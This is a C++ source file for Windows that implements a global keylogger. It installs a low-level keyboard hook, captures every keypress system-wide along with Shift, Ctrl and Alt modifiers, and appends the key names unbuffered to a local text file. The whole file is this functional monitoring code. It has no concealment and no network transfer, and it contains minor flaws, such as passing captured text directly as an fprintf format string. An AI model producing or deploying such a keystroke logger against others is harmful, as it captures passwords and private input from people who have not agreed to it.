#include <windows.h>
#include <iostream>

#pragma comment(lib, "User32.lib")


FILE *fptr;
// Handle to the hook
HHOOK hhkLowLevelKybd = NULL;

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode == HC_ACTION) {
		// Intercept Key Down events
		if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {

			KBDLLHOOKSTRUCT *pKbdStruct = (KBDLLHOOKSTRUCT *) lParam;

			DWORD vkCode = pKbdStruct->vkCode;
			DWORD scanCode = pKbdStruct->scanCode;

			LONG lKeyNameParam = 0;
			lKeyNameParam |= (scanCode << 16);
			if (pKbdStruct->flags & LLKHF_EXTENDED) {
				lKeyNameParam |= (1 << 24);
			}


			char keyName[128] = { 0 };
			// Get Key Name (e.g., "Left Shift", "A", "Space")
			if (GetKeyNameTextA(lKeyNameParam, keyName, sizeof(keyName)) > 0) {

				bool shiftDown = (GetKeyState(VK_SHIFT) & 0x8000) != 0;
				bool ctrlDown = (GetKeyState(VK_CONTROL) & 0x8000) != 0;
				bool altDown = (GetKeyState(VK_MENU) & 0x8000) != 0;

				if (shiftDown)
				{
					fprintf(fptr, "s");
				}

				if (ctrlDown) {
					fprintf(fptr, "c");
				}

				if (altDown) {
					fprintf(fptr, "a");
				}

				fprintf(fptr, keyName);
				fprintf(fptr, ".");
			}

		}
	}

	return CallNextHookEx(hhkLowLevelKybd, nCode, wParam, lParam);
}

int main() {
	fptr = fopen("keyboardlog.txt", "a");
	setvbuf(fptr, NULL, _IONBF, 0);

	if (fptr == NULL) {
		printf("Error opening file!\n");
		return 1;
	}

	hhkLowLevelKybd = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, GetModuleHandle(NULL), 0);

	if (hhkLowLevelKybd == NULL) {
		std::cerr << "Failed to install hook!" << std::endl;
		return 1;
	}

	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0)) {
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	fclose(fptr);

	UnhookWindowsHookEx(hhkLowLevelKybd);
	return 0;
}